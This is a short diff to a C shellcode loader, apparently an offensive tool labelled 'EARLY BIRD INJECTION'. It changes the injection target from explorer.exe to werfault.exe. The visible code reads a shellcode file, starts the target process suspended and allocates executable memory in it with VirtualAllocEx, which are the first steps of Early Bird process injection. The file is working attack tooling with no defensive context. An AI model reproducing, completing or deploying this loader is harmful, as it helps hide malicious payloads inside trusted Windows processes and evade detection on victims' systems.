@@ -4,7 +4,7 @@
 
 void DisplayBanner() {
     printf("\n");
-    printf("-----EPIC LOADER INJECTION-----\n");
+    printf("-----EARLY BIRD INJECTION-----\n");
     printf("BY CHRIS H\n");
     printf("\n");
 }
@@ -51,17 +51,17 @@ int main(int argc, char* argv[]) {
 
     printf("[DEBUG] Shellcode read successfully (%zu bytes).\n", shellcodeSize);
 
-    // Create a new suspended explorer.exe process
+    // Create a new suspended werfault.exe process
     STARTUPINFO si = { sizeof(STARTUPINFO) };
     PROCESS_INFORMATION pi;
 
-    if (!CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[ERROR] Failed to create a new explorer.exe process: %d\n", GetLastError());
+    if (!CreateProcess(L"C:\\Windows\\System32\\werfault.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[ERROR] Failed to create a new werfault.exe process: %d\n", GetLastError());
         free(shellcode);
         return 1;
     }
 
-    printf("[DEBUG] Suspended explorer.exe process created. PID: %d\n", pi.dwProcessId);
+    printf("[DEBUG] Suspended werfault.exe process created. PID: %d\n", pi.dwProcessId);
 
     // Allocate memory for the shellcode in the target process
     LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
